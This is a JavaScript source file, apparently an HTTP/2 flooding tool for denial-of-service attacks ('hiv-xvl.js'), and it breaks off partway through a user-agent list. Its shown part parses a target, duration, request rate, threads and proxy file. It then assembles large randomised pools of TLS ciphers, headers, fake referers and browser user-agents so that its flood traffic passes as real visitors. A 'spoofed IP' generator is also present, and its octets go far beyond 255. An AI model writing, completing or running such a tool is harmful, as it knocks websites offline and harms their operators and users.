// npm install net http2 tls cluster url crypto hpack header-generator fs axios gradient-string perf_hooks

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const hpack = require('hpack');
const { HeaderGenerator } = require('header-generator');
const fs = require("fs");
const axios = require('axios');
const gradient = require("gradient-string")
const { performance } = require("perf_hooks");
try {
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});
var headers = {};
function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}
function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}
function randomElement(elements) {
  return elements[randomInt(0, elements.length)];
}
function generateRandomString(length) {
  var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}
var spoofIP = () => {
  var getRandomByte = () => {
    return Math.floor(Math.random() * 555555);
  };
  return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};
var spoofedIP = spoofIP();
var textcolors = randomElement([gradient.atlas, gradient.cristal, gradient.teen, gradient.mind, gradient.morning, gradient.vice, gradient.passion, gradient.fruit, gradient.instagram, gradient.retro, gradient.summer, gradient.rainbow, gradient.pastel]);
var args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  rps: parseInt(process.argv[4]),
  thread: parseInt(process.argv[5]),
  proxyFile: process.argv[6],
  port: parseInt(process.argv[7]) || 443
}
if (process.argv.length < 5){
  console.log(textcolors('Usage: node hiv-xvl.js <target> <time> <rps> <thread> [proxy] [port]'));
  process.exit(-1);
}
var AlgorithmeSupport = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512',
  'ecdsa_brainpoolP256r1tls13_sha256',
  'ecdsa_brainpoolP384r1tls13_sha384',
  'ecdsa_brainpoolP512r1tls13_sha512',
  'ecdsa_sha1',
  'ed25519',
  'ed448',
  'ecdsa_sha224',
  'rsa_pkcs1_sha1',
  'rsa_pss_pss_sha256',
  'dsa_sha256',
  'dsa_sha384',
  'dsa_sha512',
  'dsa_sha224',
  'dsa_sha1',
  'rsa_pss_pss_sha384',
  'rsa_pkcs1_sha2240',
  'rsa_pss_pss_sha512',
  'sm2sig_sm3'
];

var supportedCipherSuites = [
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES128-GCM-SHA256",
  "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-ECDSA-CHACHA20-POLY1305",
  "ECDHE-RSA-AES256-SHA384",
  "ECDHE-RSA-AES128-SHA256",
  "ECDHE-ECDSA-AES256-SHA384",
  "ECDHE-ECDSA-AES128-SHA256"
];
var acceptHeaders = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,application/json;q=0.8,*/*;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,application/signed-exchange;v=b3;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "text/html,application/xml;q=0.9,application/xhtml+xml,*/*;q=0.8",
  "text/html,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,*/*;q=0.7",
  "text/html,*/*;q=0.8",
  "application/json,text/plain,*/*;q=0.8",
  "application/json,application/xml;q=0.9,*/*;q=0.8",
  "application/json,*/*;q=0.8",
  "application/json,application/javascript,*/*;q=0.8",
  "application/json,application/x-www-form-urlencoded,*/*;q=0.7",
  "application/json,text/javascript,*/*;q=0.7",
  "application/json,application/xhtml+xml,*/*;q=0.7",
  "application/json,text/css,*/*;q=0.6",
  "image/avif,image/webp,image/apng,*/*;q=0.8",
  "image/webp,image/apng,*/*;q=0.8",
  "image/avif,image/webp,*/*;q=0.8",
  "image/webp,*/*;q=0.8",
  "image/*,*/*;q=0.5",
  "application/xml,text/xml,*/*;q=0.8",
  "application/xml,*/*;q=0.7",
  "text/css,*/*;q=0.8",
  "text/css,text/plain,*/*;q=0.6",
  "application/x-www-form-urlencoded,*/*;q=0.7",
  "application/x-www-form-urlencoded,application/json,*/*;q=0.6",
  "application/signed-exchange;v=b3;q=0.9,*/*;q=0.8",
  "application/signed-exchange;v=b2,b3,*/*;q=0.7",
  "text/plain,*/*;q=0.8",
  "text/plain,application/json,*/*;q=0.6",
  "text/plain,text/html,*/*;q=0.6",
  "application/octet-stream,*/*;q=0.5",
  "application/octet-stream,application/json,*/*;q=0.5",
  "*/*",
  "*/*;q=0.7",
  "*/*;q=0.5"
];
var languageHeaders = [
  'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8'
];

var encodingHeaders = [
  'gzip',
  'gzip, deflate',
  'gzip, br',
  'gzip, deflate, br',
  'br',
  'deflate',
  'identity',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity;q=0.5, *;q=0'
];
var controlHeaders = [
  'public, max-age=604800',
  'public, max-age=86400',
  'public, immutable, max-age=31536000',
  'public, max-age=604800, stale-while-revalidate=86400',
  'public, max-age=0, must-revalidate',
  'max-age=0',
  'no-cache',
  'no-store',
  'private, no-cache, no-store, must-revalidate'
];
var referers = [
  "https://omega-echo.com",
  "https://cityguide-omega.xyz",
  "https://river.ua",
  "https://byte-horizon.net",
  "https://atlas9819.co",
  "https://nova-code6981.ua",
  "https://shop-photobox.ua",
  "https://byte.me",
  "https://travelguide.org",
  "https://delta4020.ru",
  "https://editlab.app",
  "https://media7001.com",
  "https://lambda3156.org",
  "https://grill-echo.tech",
  "https://media-shift247.biz",
  "https://game.app",
  "https://sun.site",
  "https://localmap-quickshop.co",
  "https://prime.co",
  "https://beta.com",
  "https://alpha-moon.pro",
  "https://grill.de",
  "https://news-kappa.site",
  "https://horizon-core5472.ua",
  "https://sigma-core.org",
  "https://social.de",
  "https://echo.io",
  "https://nexus.net",
  "https://forge.app",
  "https://grill.online",
  "https://pulse1599.ua",
  "https://cloud-media.shop",
  "https://studioplay9346.ru",
  "https://shop7705.com",
  "https://omega.io",
  "https://dev1002.net",
  "https://moon-atlas.xyz",
  "https://shop.pro",
  "https://media-photobox.site",
  "https://sun-delta.ru",
  "https://star-shop.online",
  "https://smartbuy6581.site",
  "https://valley-quickshop.site",
  "https://valley.xyz",
  "https://feed.xyz",
  "https://photobox-meta.site",
  "https://neo.app",
  "https://neo.io",
  "https://valley.de",
  "https://port-echo.info",
  "https://photobox-media.online",
  "https://portal.de",
  "https://studioplay6705.site",
  "https://cloud.online",
  "https://theta-theta.xyz",
  "https://island-echo4979.online",
  "https://app.info",
  "https://beta-mountain.ru",
  "https://game.app",
  "https://media.online",
  "https://moon-news.me",
  "https://island-code.ua",
  "https://gamma-alpha.me",
  "https://watchzone.org",
  "https://studioplay-cityguide.xyz",
  "https://sigma6863.info",
  "https://horizon.co",
  "https://photobox7241.ru",
  "https://valley-neo.pro",
  "https://code-star.co",
  "https://horizon-news.site",
  "https://lambda-news.de",
  "https://quickshop8961.app",
  "https://forge.xyz",
  "https://star6882.net",
  "https://kappa2120.de",
  "https://forge-nexus.co",
  "https://grill.ru",
  "https://forge.info",
  "https://horizon.org",
  "https://valley.de",
  "https://nova-shop.site",
  "https://lambda-omega.xyz",
  "https://travelguide.ua",
  "https://sigma-moon.ru",
  "https://cloud.ru",
  "https://river-lambda.shop",
  "https://game7529.info",
  "https://sun.tech",
  "https://cityguide-watchzone552.net",
  "https://streamlink-neo.net",
  "https://pulse.site",
  "https://island.biz",
  "https://quickshop-port.tech",
  "https://photobox.com",
  "https://beta-omega.ua",
  "https://travelguide-cloud1841.online",
  "https://cafe-market.me",
  "https://orbit-flux.shop",
  "https://island-pulse6382.shop",
  "https://cityguide9838.pro",
  "https://river-forge.app",
  "https://river.pro",
  "https://echo.io",
  "https://forge.net",
  "https://forge5945.co",
  "https://game-beta.pro",
  "https://core-star.de",
  "https://moon-editlab.io",
  "https://forge-neo.ru",
  "https://feed.com",
  "https://travelguide-port.org",
  "https://news.co",
  "https://feed-smartbuy.pro",
  "https://media.xyz",
  "https://portal-cyber.com",
  "https://cafe.tech",
  "https://portal-media.io",
  "https://portal.io",
  "https://game.info",
  "https://sun.info",
  "https://river3278.top",
  "https://quickshop-kappa4602.site",
  "https://core.top",
  "https://prime.shop",
  "https://localmap-valley.com",
  "https://echo-streamlink.de",
  "https://pulse.app",
  "https://kappa-orbit.biz",
  "https://editlab.me",
  "https://game.site",
  "https://hub6984.ru",
  "https://atlas-river.ru",
  "https://flux-code.org",
  "https://localmap.pro",
  "https://port.shop",
  "https://blog-omega.co",
  "https://byte-theta.app",
  "https://localmap.info",
  "https://social-moon.ru",
  "https://feed.biz",
  "https://hub-grill.online",
  "https://atlas.net",
  "https://shop-portal7749.xyz",
  "https://bistro-media5329.online",
  "https://lambda7259.com",
  "https://theta.shop",
  "https://cafe-horizon.me",
  "https://kappa-social.info",
  "https://orbit413.xyz",
  "https://shift-market.net",
  "https://core.ua",
  "https://meta.co",
  "https://beta-blog626.info",
  "https://dev4132.net",
  "https://flux-forge.biz",
  "https://cyber.biz",
  "https://port.shop",
  "https://watchzone-cyber716.info",
  "https://core-social.online",
  "https://photobox.site",
  "https://code-sigma.de",
  "https://orbit-pixel.de",
  "https://river.shop",
  "https://dev-photobox.ru",
  "https://travelguide-portal.io",
  "https://localmap-streamlink605.co",
  "https://cityguide.ru",
  "https://market9885.ru",
  "https://nova-watchzone.co",
  "https://gamma.ua",
  "https://flux.co",
  "https://lambda.ru",
  "https://nova-port.tech",
  "https://social.org",
  "https://feed7327.io",
  "https://prime-echo.app",
  "https://sun.info",
  "https://sun.top",
  "https://horizon1646.tech",
  "https://shop-alpha.net",
  "https://atlas.site",
  "https://horizon.app",
  "https://sigma.org",
  "https://cyber.ru",
  "https://portal.top",
  "https://code-moon.app",
  "https://studioplay-atlas.com",
  "https://blog.com",
  "https://cafe.tech",
  "https://portal.shop",
  "https://orbit-shift.ua",
  "https://theta-cityguide8544.me",
  "https://byte-tech.xyz",
  "https://cafe-lambda9811.top",
  "https://social.top",
  "https://mountain-cityguide4095.org",
  "https://prime-editlab.xyz",
  "https://omega-nexus.info",
  "https://pixel.site",
  "https://tech7043.de",
  "https://editlab-nova.biz",
  "https://quickshop.ru",
  "https://studioplay-cityguide2139.info",
  "https://pixel.pro",
  "https://cafe-pulse2421.top",
  "https://port.biz",
  "https://sun-moon2151.ua",
  "https://orbit.pro",
  "https://photobox.me",
  "https://moon-omega.org",
  "https://kappa.ua",
  "https://mountain-moon.site",
  "https://hub-editlab1714.ua",
  "https://watchzone.net",
  "https://photobox-kappa.me",
  "https://editlab7834.org",
  "https://star.pro",
  "https://grill-bistro.io",
  "https://atlas.net",
  "https://photobox.pro",
  "https://lambda.xyz",
  "https://bistro.shop",
  "https://pulse.ua",
  "https://sigma.co",
  "https://shift-photobox.shop",
  "https://dev455.io",
  "https://flux.xyz",
  "https://media.net",
  "https://nova.site",
  "https://omega-theta.pro",
  "https://travelguide-kappa.shop",
  "https://forge.info",
  "https://hub.com",
  "https://grill-feed.org",
  "https://nexus.ru",
  "https://watchzone.com",
  "https://app.top",
  "https://travelguide-star.de",
  "https://market.site",
  "https://alpha.org",
  "https://island.site",
  "https://cyber-smartbuy.ua",
  "https://code.com",
  "https://nexus-flux.xyz",
  "https://media.ru",
  "https://sigma.xyz",
  "https://theta.ua",
  "https://code-watchzone.de",
  "https://media-smartbuy7380.shop",
  "https://island-pulse.org",
  "https://echo-cafe.org",
  "https://smartbuy.org",
  "https://river.me",
  "https://omega-valley.pro",
  "https://horizon-editlab.biz",
  "https://river.xyz",
  "https://cloud-game.xyz",
  "https://travelguide.online",
  "https://core.ru",
  "https://cityguide.ua",
  "https://app-tech.org",
  "https://market-neo.com",
  "https://smartbuy.me",
  "https://neo.ru",
  "https://portal-delta.de",
  "https://alpha.biz",
  "https://theta-blog.online",
  "https://island.pro",
  "https://byte.org",
  "https://travelguide-pixel4448.de",
  "https://beta.app",
  "https://valley-core3338.com",
  "https://feed.com",
  "https://smartbuy.shop",
  "https://editlab.shop",
  "https://watchzone-code2541.ua",
  "https://prime-delta.de",
  "https://horizon-meta6134.biz",
  "https://meta-port.info",
  "https://island.net",
  "https://cafe.io",
  "https://blog.co",
  "https://cafe-studioplay8375.app",
  "https://cloud7433.biz",
  "https://cityguide-watchzone.shop",
  "https://alpha.net",
  "https://flux.pro",
  "https://pulse-river.pro",
  "https://echo.org",
  "https://kappa-star.ru",
  "https://smartbuy.de",
  "https://bistro.tech",
  "https://pulse-theta.co",
  "https://valley-cloud5798.app",
  "https://neo-media2993.xyz",
  "https://market.com",
  "https://kappa6330.xyz",
  "https://photobox-kappa.com",
  "https://beta4281.online",
  "https://watchzone.app",
  "https://market.site",
  "https://feed-kappa1030.org",
  "https://travelguide954.pro",
  "https://mountain.app",
  "https://flux.online",
  "https://cyber.de",
  "https://cityguide8847.top",
  "https://sigma4691.ua",
  "https://cafe.de",
  "https://watchzone-meta2945.top",
  "https://travelguide.io",
  "https://orbit.site",
  "https://island-moon.me",
  "https://neo.online",
  "https://river-pulse7190.top",
  "https://quickshop-localmap.de",
  "https://grill.tech",
  "https://mountain.app",
  "https://feed-cloud.com",
  "https://atlas.net",
  "https://editlab-byte.de",
  "https://shop.biz",
  "https://gamma.site",
  "https://beta-beta.pro",
  "https://theta-mountain148.ua",
  "https://sigma.me",
  "https://theta-cityguide.info",
  "https://meta-sun.com",
  "https://shift.me",
  "https://pulse4437.com",
  "https://game-prime9796.biz",
  "https://watchzone.tech",
  "https://byte.app",
  "https://flux.ua",
  "https://flux.com",
  "https://travelguide-nova.org",
  "https://star.biz",
  "https://tech7155.biz",
  "https://lambda.site",
  "https://star6078.top",
  "https://nexus.info",
  "https://cyber5737.tech",
  "https://news-mountain.me",
  "https://river.net",
  "https://core9399.online",
  "https://watchzone.org",
  "https://prime.app",
  "https://omega-port.ru",
  "https://dev-valley.ru",
  "https://atlas2206.biz",
  "https://dev-travelguide.xyz",
  "https://dev.tech",
  "https://sigma-sun6901.online",
];
if (fs.existsSync(process.cwd()+`/referer.txt`)) {
  referers = readLines(process.cwd()+'/referer.txt');
}
var defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
var ciphersh = "GREASE:" + [
  defaultCiphers[2],
  defaultCiphers[1],
  defaultCiphers[0],
  ...defaultCiphers.slice(3)
].join(":");
var UAList = [
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.5720.660 Safari/537.36 OPR/66.8",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/600.8 (KHTML, like Gecko) Version/16.2 Safari/600.8",
  "Mozilla/5.0 (Linux; Android 12; V2164; 6ZS/32) AppleWebKit/537.36 (KHTML, like Gecko) Brave/114.0.3335.550 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.5157.897 Safari/537.36 SamsungBrowser/23.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/660.9 (KHTML, like Gecko) Version/13.2 Safari/660.9",
  "Mozilla/5.0 (Linux; Android 13; CPH2483; SK1/13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4460.770 Safari/537.36 SamsungBrowser/21.0",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5194.273 Safari/537.36 SamsungBrowser/23.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.3638.947 Safari/537.36 Edg/100.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3195.799 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.3830.396 Safari/537.36 Edg/106.2",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.5002.925 Safari/537.36 Edg/106.1",
  "Mozilla/5.0 (Linux; Android 13; SM-S908E; CIN/49) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.5599.749 Safari/537.36 Edg/110.3",
  "Mozilla/5.0 (iPhone16,1; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.3804.353 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3165.652 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/670.4 (KHTML, like Gecko) Version/11.1 Safari/670.4",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.5637.439 Safari/537.36",
  "Mozilla/5.0 (X11; Arch Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.3062.363 Safari/537.36 Edg/80.3",
  "Mozilla/5.0 (Android 13; Mobile; OHV/2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.3460.403 Safari/537.36 SamsungBrowser/19.0",
  "Mozilla/5.0 (Macintosh; Apple Silicon Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5770.192 Safari/537.36 OPR/68.6",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.3253.307 Safari/537.36 SamsungBrowser/21.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.3055.763 Safari/537.36 SamsungBrowser/17.0",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.3450.177 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.5716.238 Safari/537.36",
  "Mozilla/5.0 (X11; Arch Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/104.0.4911.440 Safari/537.36",
  "Mozilla/5.0 (iPhone16,1; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5780.746 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; 23049PCD8G; D7V/94) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.4145.83 Safari/537.36 Edg/92.0",
  "Mozilla/5.0 (iPhone16,2; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.3574.683 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; V2304; K1Y/55) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.3940.330 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5506.537 Safari/537.36",
  "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.3172.466 Safari/537.36 SamsungBrowser/20.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/120.0.5036.617 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; HUAWEI P50; LW7/77) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.3846.454 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; 23049PCD8G; DQC/70) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5227.835 Safari/537.36 OPR/74.7",
  "Mozilla/5.0 (Linux; Android 13; SM-S908E; I6Z/75) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5690.200 Safari/537.36 OPR/80.9",
  "Mozilla/5.0 (Linux; Android 14; SM-S918B; 8J6/26; rv:88.1) Gecko/20100101 Firefox/88.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.3627.281 Safari/537.36 Edg/112.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5236.666 Safari/537.36 OPR/62.0",
  "Mozilla/5.0 (Linux; Android 13; 23049PCD8G; MVT/93) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.3025.230 Safari/537.36 SamsungBrowser/17.0",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.4788.365 Safari/537.36 OPR/68.8",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4006.436 Safari/537.36 Edg/104.0",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.5307.935 Safari/537.36 SamsungBrowser/17.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.5443.42 Safari/537.36 Edg/100.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4546.807 Safari/537.36 Edg/80.3",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4870.149 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.8) Gecko/20100101 Firefox/80.8",
  "Mozilla/5.0 (iPhone16,2; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5889.457 Safari/537.36 OPR/82.2",
  "Mozilla/5.0 (Linux; Android 12; SM-A546E; WP5/74) AppleWebKit/537.36 (KHTML, like Gecko) Brave/94.0.3668.302 Safari/537.36",
  "Mozilla/5.0 (X11; Arch Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.4662.621 Safari/537.36 Edg/88.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/600.0 (KHTML, like Gecko) Version/16.2 Safari/600.0",
  "Mozilla/5.0 (Macintosh; Apple Silicon Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Brave/118.0.5266.55 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.3448.33 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.3234.673 Safari/537.36 OPR/70.3",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Brave/102.0.5368.595 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.3293.276 Safari/537.36 SamsungBrowser/23.0",
  "Mozilla/5.0 (iPad; CPU OS 15_7 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.4335.81 Safari/537.36",
